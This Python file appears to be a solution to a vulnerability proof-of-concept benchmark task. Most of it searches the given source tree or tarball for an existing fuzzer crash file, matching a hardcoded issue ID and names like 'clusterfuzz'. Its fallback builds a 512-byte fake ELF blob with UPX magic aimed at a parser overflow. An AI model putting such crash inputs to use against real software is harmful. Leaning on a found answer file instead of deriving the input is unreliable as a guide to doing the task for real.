import os
import tarfile
import stat
from typing import List, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball or extracted directory

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Try directory mode first
        try:
            if os.path.isdir(src_path):
                data = self._find_poc_in_dir(src_path)
                if data is not None:
                    return data
        except Exception:
            pass

        # If not a directory or failed, try as a tarball
        try:
            if os.path.isfile(src_path) and tarfile.is_tarfile(src_path):
                data = self._find_poc_in_tar(src_path)
                if data is not None:
                    return data
        except Exception:
            pass

        # Fallback: return a generic 512-byte blob (unlikely to be needed in intended setup)
        return self._fallback_poc()

    # ---------------- Directory handling ----------------

    def _find_poc_in_dir(self, root: str) -> Optional[bytes]:
        metas: List[Tuple[str, int]] = []

        for dirpath, _, filenames in os.walk(root):
            for fname in filenames:
                full = os.path.join(dirpath, fname)
                try:
                    st = os.stat(full)
                except OSError:
                    continue
                if not stat.S_ISREG(st.st_mode):
                    continue
                size = int(st.st_size)
                if size <= 0:
                    continue
                metas.append((full, size))

        if not metas:
            return None

        # Phase 1: name-based pattern search
        data = self._select_by_pattern_dir(metas)
        if data is not None:
            return data

        # Phase 2: exact size 512, binary preference
        data = self._select_by_size_dir(metas, target_size=512)
        if data is not None:
            return data

        # Phase 3: approximate size near 512
        data = self._select_by_approx_size_dir(metas, target_size=512, max_candidates=16)
        if data is not None:
            return data

        return None

    def _select_by_pattern_dir(self, metas: List[Tuple[str, int]]) -> Optional[bytes]:
        candidates: List[Tuple[int, int, str]] = []  # (score, -size_penalty, path)

        for path, size in metas:
            lower = path.lower()
            base = os.path.basename(path)
            ext = os.path.splitext(base)[1].lower()

            if size <= 0:
                continue
            if size > 8 * 1024 * 1024:
                continue  # skip very large

            score = self._pattern_score(lower, ext, size)
            if score <= 0:
                continue

            size_penalty = abs(size - 512)
            candidates.append((score, -size_penalty, path))

        if not candidates:
            return None

        # Choose best candidate by score then closeness to 512
        candidates.sort(reverse=True)
        best_path = candidates[0][2]

        try:
            with open(best_path, "rb") as f:
                return f.read()
        except OSError:
            return None

    def _select_by_size_dir(self, metas: List[Tuple[str, int]], target_size: int) -> Optional[bytes]:
        exact: List[str] = [p for (p, s) in metas if s == target_size]
        if not exact:
            return None

        if len(exact) == 1:
            try:
                with open(exact[0], "rb") as f:
                    return f.read()
            except OSError:
                return None

        # Multiple 512-byte files: prefer most "binary" and with matching patterns
        best_path = None
        best_score = -1.0

        for path in exact:
            try:
                with open(path, "rb") as f:
                    data = f.read(target_size)
            except OSError:
                continue

            bin_score = self._binary_score(data)
            lower = path.lower()
            base = os.path.basename(path)
            ext = os.path.splitext(base)[1].lower()
            pattern_bonus = 0
            if "383200048" in lower:
                pattern_bonus += 0.3
            if "poc" in lower or "testcase" in lower or "clusterfuzz" in lower or "oss-fuzz" in lower:
                pattern_bonus += 0.3
            if ext in {".bin", ".dat", ".raw", ".so", ".elf", ".exe", ".dll", ".out", ".poc", ".testcase", ".upx"}:
                pattern_bonus += 0.2

            score = bin_score + pattern_bonus
            if score > best_score:
                best_score = score
                best_path = path

        if best_path is None:
            return None

        try:
            with open(best_path, "rb") as f:
                return f.read()
        except OSError:
            return None

    def _select_by_approx_size_dir(
        self,
        metas: List[Tuple[str, int]],
        target_size: int,
        max_candidates: int = 16,
    ) -> Optional[bytes]:
        # Consider reasonably small files
        approx: List[Tuple[int, str, int]] = []
        for path, size in metas:
            if size <= 0 or size > 16 * 1024:
                continue
            dist = abs(size - target_size)
            approx.append((dist, path, size))

        if not approx:
            return None

        approx.sort(key=lambda x: (x[0], x[2]))
        approx = approx[:max_candidates]

        best_data = None
        best_score = -1.0

        for _, path, size in approx:
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                continue

            bin_score = self._binary_score(data)
            lower = path.lower()
            base = os.path.basename(path)
            ext = os.path.splitext(base)[1].lower()
            pattern_bonus = 0.0
            if "383200048" in lower:
                pattern_bonus += 0.4
            if "poc" in lower or "testcase" in lower or "clusterfuzz" in lower or "oss-fuzz" in lower:
                pattern_bonus += 0.4
            if ext in {".bin", ".dat", ".raw", ".so", ".elf", ".exe", ".dll", ".out", ".poc", ".testcase", ".upx"}:
                pattern_bonus += 0.2

            size_penalty = abs(len(data) - target_size) / float(target_size + 1)
            score = bin_score + pattern_bonus - size_penalty
            if score > best_score:
                best_score = score
                best_data = data

        return best_data

    # ---------------- Tarball handling ----------------

    def _find_poc_in_tar(self, tar_path: str) -> Optional[bytes]:
        try:
            with tarfile.open(tar_path, "r:*") as tf:
                members = [m for m in tf.getmembers() if m.isreg() and m.size > 0]
                if not members:
                    return None

                # Phase 1: name-based pattern search
                data = self._select_by_pattern_tar(tf, members)
                if data is not None:
                    return data

                # Phase 2: exact size 512
                data = self._select_by_size_tar(tf, members, target_size=512)
                if data is not None:
                    return data

                # Phase 3: approximate size near 512
                data = self._select_by_approx_size_tar(tf, members, target_size=512, max_candidates=16)
                if data is not None:
                    return data

                return None
        except (tarfile.TarError, OSError):
            return None

    def _select_by_pattern_tar(self, tf: tarfile.TarFile, members: List[tarfile.TarInfo]) -> Optional[bytes]:
        candidates: List[Tuple[int, int, tarfile.TarInfo]] = []  # (score, -size_penalty, member)

        for m in members:
            path = m.name
            size = int(m.size)
            if size <= 0 or size > 8 * 1024 * 1024:
                continue

            lower = path.lower()
            base = os.path.basename(path)
            ext = os.path.splitext(base)[1].lower()
            score = self._pattern_score(lower, ext, size)
            if score <= 0:
                continue

            size_penalty = abs(size - 512)
            candidates.append((score, -size_penalty, m))

        if not candidates:
            return None

        candidates.sort(reverse=True)
        best_member = candidates[0][2]

        try:
            f = tf.extractfile(best_member)
            if not f:
                return None
            data = f.read()
            f.close()
            return data
        except (tarfile.TarError, OSError):
            return None

    def _select_by_size_tar(
        self,
        tf: tarfile.TarFile,
        members: List[tarfile.TarInfo],
        target_size: int,
    ) -> Optional[bytes]:
        exact = [m for m in members if int(m.size) == target_size]
        if not exact:
            return None

        if len(exact) == 1:
            try:
                f = tf.extractfile(exact[0])
                if not f:
                    return None
                data = f.read()
                f.close()
                return data
            except (tarfile.TarError, OSError):
                return None

        best_member = None
        best_score = -1.0

        for m in exact:
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read(target_size)
                f.close()
            except (tarfile.TarError, OSError):
                continue

            bin_score = self._binary_score(data)
            path = m.name
            lower = path.lower()
            base = os.path.basename(path)
            ext = os.path.splitext(base)[1].lower()
            pattern_bonus = 0.0
            if "383200048" in lower:
                pattern_bonus += 0.3
            if "poc" in lower or "testcase" in lower or "clusterfuzz" in lower or "oss-fuzz" in lower:
                pattern_bonus += 0.3
            if ext in {".bin", ".dat", ".raw", ".so", ".elf", ".exe", ".dll", ".out", ".poc", ".testcase", ".upx"}:
                pattern_bonus += 0.2

            score = bin_score + pattern_bonus
            if score > best_score:
                best_score = score
                best_member = m

        if best_member is None:
            return None

        try:
            f = tf.extractfile(best_member)
            if not f:
                return None
            data = f.read()
            f.close()
            return data
        except (tarfile.TarError, OSError):
            return None

    def _select_by_approx_size_tar(
        self,
        tf: tarfile.TarFile,
        members: List[tarfile.TarInfo],
        target_size: int,
        max_candidates: int = 16,
    ) -> Optional[bytes]:
        approx: List[Tuple[int, tarfile.TarInfo]] = []
        for m in members:
            size = int(m.size)
            if size <= 0 or size > 16 * 1024:
                continue
            dist = abs(size - target_size)
            approx.append((dist, m))

        if not approx:
            return None

        approx.sort(key=lambda x: (x[0], int(x[1].size)))
        approx = approx[:max_candidates]

        best_data = None
        best_score = -1.0

        for _, m in approx:
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
                f.close()
            except (tarfile.TarError, OSError):
                continue

            bin_score = self._binary_score(data)
            path = m.name
            lower = path.lower()
            base = os.path.basename(path)
            ext = os.path.splitext(base)[1].lower()
            pattern_bonus = 0.0
            if "383200048" in lower:
                pattern_bonus += 0.4
            if "poc" in lower or "testcase" in lower or "clusterfuzz" in lower or "oss-fuzz" in lower:
                pattern_bonus += 0.4
            if ext in {".bin", ".dat", ".raw", ".so", ".elf", ".exe", ".dll", ".out", ".poc", ".testcase", ".upx"}:
                pattern_bonus += 0.2

            size_penalty = abs(len(data) - target_size) / float(target_size + 1)
            score = bin_score + pattern_bonus - size_penalty
            if score > best_score:
                best_score = score
                best_data = data

        return best_data

    # ---------------- Scoring helpers ----------------

    def _pattern_score(self, path_lower: str, ext: str, size: int) -> int:
        # Basic keywords indicative of PoC / fuzzing artifacts
        keywords = [
            "poc",
            "proof",
            "crash",
            "heap-buffer-overflow",
            "heap_buffer_overflow",
            "overflow",
            "testcase",
            "minimized",
            "clusterfuzz",
            "oss-fuzz",
            "fuzz",
            "383200048",
            "id_",
        ]

        base_score = 0
        for kw in keywords:
            if kw in path_lower:
                if kw == "383200048":
                    base_score += 40
                elif kw in ("clusterfuzz", "oss-fuzz", "minimized", "testcase"):
                    base_score += 25
                elif kw in ("poc", "crash", "heap-buffer-overflow", "heap_buffer_overflow"):
                    base_score += 20
                else:
                    base_score += 10

        # Penalize obvious text/code files
        text_exts = {
            ".c",
            ".cc",
            ".cpp",
            ".cxx",
            ".h",
            ".hpp",
            ".hh",
            ".py",
            ".sh",
            ".md",
            ".txt",
            ".rst",
            ".html",
            ".htm",
            ".js",
            ".java",
            ".rs",
            ".go",
            ".php",
            ".rb",
            ".pl",
            ".yml",
            ".yaml",
            ".json",
            ".xml",
            ".toml",
            ".cfg",
            ".ini",
            ".cmake",
            ".in",
            ".am",
            ".ac",
            ".m4",
            ".s",
            ".asm",
        }
        if ext in text_exts:
            base_score -= 40

        # Bonus for binary-like extensions
        binary_exts = {
            ".bin",
            ".dat",
            ".raw",
            ".so",
            ".elf",
            ".exe",
            ".dll",
            ".out",
            ".class",
            ".poc",
            ".testcase",
            ".upx",
        }
        if ext in binary_exts or ext == "":
            base_score += 10

        # Prefer sizes near 512
        if size == 512:
            base_score += 50
        else:
            diff = abs(size - 512)
            if diff <= 16:
                base_score += 30
            elif diff <= 64:
                base_score += 20
            elif diff <= 256:
                base_score += 10

        return base_score

    def _binary_score(self, data: bytes) -> float:
        if not data:
            return 0.0
        nontext = 0
        for b in data:
            if b == 9 or b == 10 or b == 13:
                continue  # whitespace
            if b < 32 or b > 126:
                nontext += 1
        return nontext / float(len(data))

    # ---------------- Fallback PoC ----------------

    def _fallback_poc(self) -> bytes:
        # Generic 512-byte blob with ELF + UPX-like magic; deterministic
        # ELF header (minimal) followed by pattern and padding
        elf_header = bytearray(52)
        # e_ident
        elf_header[0:4] = b"\x7fELF"
        elf_header[4] = 1  # 32-bit
        elf_header[5] = 1  # little-endian
        elf_header[6] = 1  # version
        # e_type (ET_DYN)
        elf_header[16:18] = (3).to_bytes(2, "little")
        # e_machine (EM_386)
        elf_header[18:20] = (3).to_bytes(2, "little")
        # e_version
        elf_header[20:24] = (1).to_bytes(4, "little")
        # Put a fake UPX! string somewhere to reach UPX parser paths
        body = b"UPX!" * 50
        poc = bytes(elf_header) + body
        if len(poc) < 512:
            poc += b"A" * (512 - len(poc))
        return poc[:512]
